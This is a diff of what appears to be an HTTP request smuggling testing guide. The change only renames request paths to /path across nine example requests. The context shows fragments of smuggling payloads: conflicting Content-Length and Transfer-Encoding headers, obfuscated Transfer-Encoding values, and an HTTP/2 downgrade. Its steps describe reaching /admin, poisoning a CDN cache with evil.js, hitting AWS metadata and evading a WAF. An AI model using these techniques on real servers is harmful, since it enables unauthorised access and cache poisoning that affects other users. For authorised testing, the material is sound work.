@@ -13,7 +13,7 @@
 Inject conflicting Content-Length and Transfer-Encoding headers to test for desync
 
 ```http
-POST /api HTTP/1.1
+POST /path HTTP/1.1
 Host: target.com
 Content-Length: 50
 Transfer-Encoding: chunked
@@ -37,7 +37,7 @@ Check if the response indicates the backend processed the smuggled `GET /admin` 
 If the site supports HTTP/2, force a downgrade to HTTP/1.1 with a smuggling payload
 
 ```http
-POST /api HTTP/2
+POST /path HTTP/2
 Host: target.com
 Transfer-Encoding: chunked
 Transfer-Encoding: chunked
@@ -61,7 +61,7 @@ Verify if the backend executes the smuggled GET /admin request
 Inject multiple Transfer-Encoding headers to confuse proxy parsing
 
 ```http
-POST /api HTTP/1.1
+POST /path HTTP/1.1
 Host: target.com
 Transfer-Encoding: chunked
 Transfer-Encoding: chunked
@@ -85,7 +85,7 @@ Check if the smuggled request is processed by the backend
 Use malformed Transfer-Encoding headers to bypass validation
 
 ```http
-POST /api HTTP/1.1
+POST /path HTTP/1.1
 Host: vulnerable.com
 Transfer-Encoding: cHuNkEd
 Content-Length: 60
@@ -109,7 +109,7 @@ Verify if the response includes evidence of the smuggled request
 Inject a payload to poison the CDN cache
 
 ```http
-POST / HTTP/1.1
+POST /path HTTP/1.1
 Host: target.com
 Transfer-Encoding: chunked
 Content-Length: 60
@@ -134,7 +134,7 @@ Check if the cache serves evil.js to subsequent users
 Smuggle a payload to access internal services
 
 ```http
-POST /api HTTP/1.1
+POST /path HTTP/1.1
 Host: target.com
 Transfer-Encoding: chunked
 Content-Length: 60
@@ -158,7 +158,7 @@ Verify if the response contains internal metadata (AWS metadata)
 Split payloads to evade WAF detection
 
 ```http
-POST /api HTTP/1.1
+POST /path HTTP/1.1
 Host: target.com
 Transfer-Encoding: chunked
 X-Bypass: evasion
@@ -182,7 +182,7 @@ Check if the smuggled request bypasses the WAF and reaches the backend
 Inject a time-delayed payload to detect blind smuggling
 
 ```http
-POST /api HTTP/1.1
+POST /path HTTP/1.1
 Host: target.com
 Transfer-Encoding: chunked
 Content-Length: 40
@@ -206,7 +206,7 @@ Measure response delays to infer smuggling success
 Inject payloads across a chain of proxies (CDN → Load Balancer → Backend)
 
 ```http
-POST /api HTTP/1.1
+POST /path HTTP/1.1
 Host: target.com
 Transfer-Encoding: chunked
 Content-Length: 60
